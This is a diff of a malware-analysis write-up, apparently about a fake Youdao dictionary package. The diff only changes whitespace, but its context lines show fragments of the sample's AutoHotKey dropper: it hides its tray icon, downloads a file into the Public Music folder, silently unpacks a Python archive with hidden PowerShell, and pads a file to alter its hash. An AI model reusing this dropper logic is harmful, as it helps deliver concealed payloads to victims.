@@ -21,8 +21,8 @@ https://www.google.com/search?q=%E6%9C%89%E9%81%93%E5%AD%97%E5%85%B8&newwindow=1
 ![er](/imgs/rev/virus/vyoudao/3.png)
 
 ```AutoHotKey
-#NoTrayIcon 
-#NoEnv 
+#NoTrayIcon
+#NoEnv
 #NoTrayIcon
 #SingleInstance off
    try
@@ -39,13 +39,13 @@ localFile := "C:\Users\Public\Music\Update\AutoHotkey\AutoHotkey.ahk"
 UrlDownloadToFile, %url%, %localFile%
 RunWait, %comspec% /c powershell.exe -Command Expand-Archive -Path C:\Users\Public\Music\python\Py.zip -DestinationPath C:\Users\Public\Music\python , , Hide
 randomString := ""
-Lenght := rand(1,10) 
+Lenght := rand(1,10)
 Loop, %Lenght%
 {
-    Random, char, 48, 122 
-    If (char > 57 && char < 65) || (char > 90 && char < 97) 
+    Random, char, 48, 122
+    If (char > 57 && char < 65) || (char > 90 && char < 97)
         Continue
-    randomString .= Chr(char) 
+    randomString .= Chr(char)
 }
 FileAppend, %randomString%, C:\Users\Public\Music\python\qd.jpg
 
@@ -294,5 +294,5 @@ def main():
 if __name__ == "__main__":
     main()
 
-# 
+#
 ```
